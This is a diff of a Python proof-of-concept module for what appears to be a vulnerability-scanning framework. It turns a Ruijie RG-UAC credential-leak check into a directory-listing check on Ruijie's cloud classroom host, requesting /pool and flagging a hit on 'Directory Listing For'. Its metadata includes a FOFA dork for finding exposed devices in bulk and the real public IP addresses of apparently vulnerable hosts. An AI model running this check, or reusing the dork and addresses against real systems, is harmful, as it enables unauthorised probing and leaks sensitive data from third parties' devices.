@@ -10,27 +10,26 @@ class POC(POCBase):
 
     _info = {
         "author" : "jijue",                      # POC作者
-        "version" : "2",                    # POC版本，默认是1  
+        "version" : "1",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-            v2 考虑到RG-ISC的账号密码泄露几乎一模一样，
-            只有返回时的部分字段存在出入，此版本做了小小的修改
+        略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "锐捷RG-UAC/RG-ISG统一上网行为管理审计系统存在账号密码信息泄露",                        # 漏洞名称
-        "VulnID" : "CNVD-2021-14536",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "锐捷RG-UAC统一上网行为管理审计系统",                     # 漏洞应用名称
+        "name" : "锐捷云课堂主机 目录遍历漏洞",                        # 漏洞名称
+        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "锐捷云课堂",                     # 漏洞应用名称
         "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            锐捷RG-UAC/RG-ISG统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台
+            锐捷云课堂主机存在目录遍历漏洞，通过访问get请求/pool/，即可读取目录.导致敏感信息泄露.
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            title="RG-UAC登录页面"
+            title="Ruijie" && "云课堂主机"
         """,                     # fofa搜索语句
-        "example" : "https://60.2.178.226:1443",                     # 存在漏洞的演示url，写一个就可以了
+        "example" : "http://61.187.248.240:8080",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
     }
 
@@ -43,7 +42,7 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "" # url自己按需调整
+        url = self.target + "/pool" # url自己按需调整
         
 
         headers = {"User-Agent":get_random_ua(),
@@ -56,7 +55,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "pre_define" in req.text and "name" in req.text and "password" in req.text:#req.status_code == 200 and :
+            if "Directory Listing For" in req.text and req.status_code == 200 :
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
